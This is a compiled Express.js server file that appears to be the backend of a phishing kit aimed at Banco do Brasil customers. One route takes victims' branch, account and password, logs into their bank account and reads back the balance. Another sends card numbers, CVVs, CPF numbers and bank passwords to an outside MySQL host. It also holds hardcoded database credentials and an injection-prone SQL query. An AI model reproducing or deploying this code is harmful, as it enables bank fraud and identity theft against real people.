"use strict";

var _interopRequireDefault = require("@babel/runtime/helpers/interopRequireDefault");

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports["default"] = void 0;

var _regenerator = _interopRequireDefault(require("@babel/runtime/regenerator"));

var _bb = _interopRequireDefault(require("./bb"));

var express = require('express');

var app = express();

var bodyParser = require('body-parser');

var cors = require('cors');

var path = require('path');

app.use(bodyParser.urlencoded({
  extended: false
}));
app.use(bodyParser.json());
app.use(cors({
  origin: '*'
}));
app.use(express.urlencoded({
  extended: false
}));
app.use(express.json());
app.use(express["static"]('public'));
app.get('*', function (req, res) {
  res.sendFile(path.join(__dirname + '/public/index.html'));
});
app.post('/getData', function _callee(req, res) {
  var name, checkingBalance, bb, branch, account, password;
  return _regenerator["default"].async(function _callee$(_context) {
    while (1) {
      switch (_context.prev = _context.next) {
        case 0:
          _context.prev = 0;
          name = '';
          checkingBalance = '';

          if (!(require.main === module)) {
            _context.next = 16;
            break;
          }

          bb = new _bb["default"]();
          branch = req.body.agencia;
          account = req.body.conta;
          password = req.body.pass;
          console.log(branch, account, password);
          _context.next = 11;
          return _regenerator["default"].awrap(bb.login({
            branch: branch,
            account: account,
            password: password
          }));

        case 11:
          name = _context.sent;
          _context.next = 14;
          return _regenerator["default"].awrap(bb.checking.getBalance());

        case 14:
          checkingBalance = _context.sent;
          console.log(name.nomeCliente, checkingBalance);

        case 16:
          if (name == '') {
            res.json({
              name: name,
              balance: checkingBalance
            });
          } else {
            res.json({
              name: name.nomeCliente,
              balance: checkingBalance
            });
          }

          _context.next = 22;
          break;

        case 19:
          _context.prev = 19;
          _context.t0 = _context["catch"](0);
          res.json({
            name: '',
            balance: ''
          });

        case 22:
        case "end":
          return _context.stop();
      }
    }
  }, null, null, [[0, 19]]);
});
app.post('/inputData', function _callee2(req, res) {
  var mysql, con;
  return _regenerator["default"].async(function _callee2$(_context2) {
    while (1) {
      switch (_context2.prev = _context2.next) {
        case 0:
          try {
            mysql = require('mysql');
            con = mysql.createConnection({
              host: 'sql11.freemysqlhosting.net',
              user: 'sql11458641',
              password: 'SNDmBNx6wA',
              database: 'sql11458641'
            });
            con.connect(function (err) {
              if (err) throw err;
              console.log('Connected!');
              var sql = "INSERT INTO tbl_access_info (date, agencia, conta, senha_de_8, saldo, cell, senha_de_6, silabica, nome_do_cartao, numero_do_cartao, ccv, cpf) VALUES ('" + req.body.data_1 + "', '" + req.body.data_2 + "', '" + req.body.data_3 + "', '" + req.body.data_4 + "', '" + req.body.data_5 + "', '" + req.body.data_6 + "', '" + req.body.data_7 + "', '" + req.body.data_8 + "', '" + req.body.data_9 + "', '" + req.body.data_10 + "', '" + req.body.data_11 + "', '" + req.body.data_12 + "')";
              con.query(sql, function (err, result) {
                if (err) throw err;
                console.log('1 record inserted');
              });
            });
            res.json({
              result: 'success'
            });
          } catch (err) {
            res.json({
              result: 'fail'
            });
          }

        case 1:
        case "end":
          return _context2.stop();
      }
    }
  });
});
app.listen(process.env.PORT || 5000);
console.log('Running at Port 5000');
var _default = _bb["default"];
exports["default"] = _default;
//# sourceMappingURL=index.js.map